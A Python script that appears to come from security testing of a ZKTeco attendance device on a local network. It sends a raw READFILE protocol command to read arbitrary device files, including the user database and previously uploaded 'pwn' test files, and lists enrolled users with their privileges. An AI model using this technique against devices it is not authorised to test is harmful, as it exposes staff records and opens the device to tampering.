#!/usr/bin/env python3
"""Check if uploaded files still exist on device."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def download_file(conn, path, timeout_s=10):
    r = send_cmd(conn, 0x6A6, (path + '\x00').encode())
    print('  READFILE', path, ':', r)
    sock = conn._ZK__sock
    sock.settimeout(timeout_s)
    total = b''
    chunks = 0
    while True:
        try:
            chunk = sock.recv(65536)
            if not chunk: break
            if len(chunk) >= 16:
                top1, top2, tcp_len = unpack('<HHI', chunk[:8])
                zk_cmd = unpack('<H', chunk[8:10])[0]
                body = chunk[16:16+(tcp_len - 8)] if tcp_len > 8 else b''
                total += body
                chunks += 1
                if zk_cmd == 0x07D0 or zk_cmd == 2000: break
                if chunks > 50 and len(total) > 0: break
        except socket.timeout: break
    return total, chunks

zk = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version())

try: conn.disable_device()
except: pass

# Check various paths
paths = [
    '/mnt/mtdblock/data/mavis_pic.txt',
    '/mnt/mtdblock/data/mavis_evidence.txt',
    '/mnt/mtdblock/data/mavis_pwn.txt',
    '/mnt/mtdblock/data/mavis_zkdb_test.db',
    '/mnt/mtdblock/data/pure_100.txt',
    '/mnt/mtdblock/data/pure_1mb.bin',
    '/mnt/mtdblock/data/ZKDB.db',
]

print('\n[*] Checking which uploaded files still exist...')
for path in paths:
    data, chunks = download_file(conn, path)
    print('  {}: {} bytes ({} chunks)'.format(path, len(data), chunks))
    if data and len(data) < 200:
        print('    Content:', data[:100])

# Also check what users are in ZKDB.db now
print('\n[*] Reading current users from device...')
try:
    users = conn.get_users()
    print('  Users:', len(users))
    if users:
        print('  First 5:')
        for u in users[:5]:
            print('   ', u.user_id, u.name, u.privilege)
except Exception as e:
    print('  Err:', e)

try: conn.enable_device()
except: pass
try: conn.disconnect()
except: pass
print('\n[+] Done')
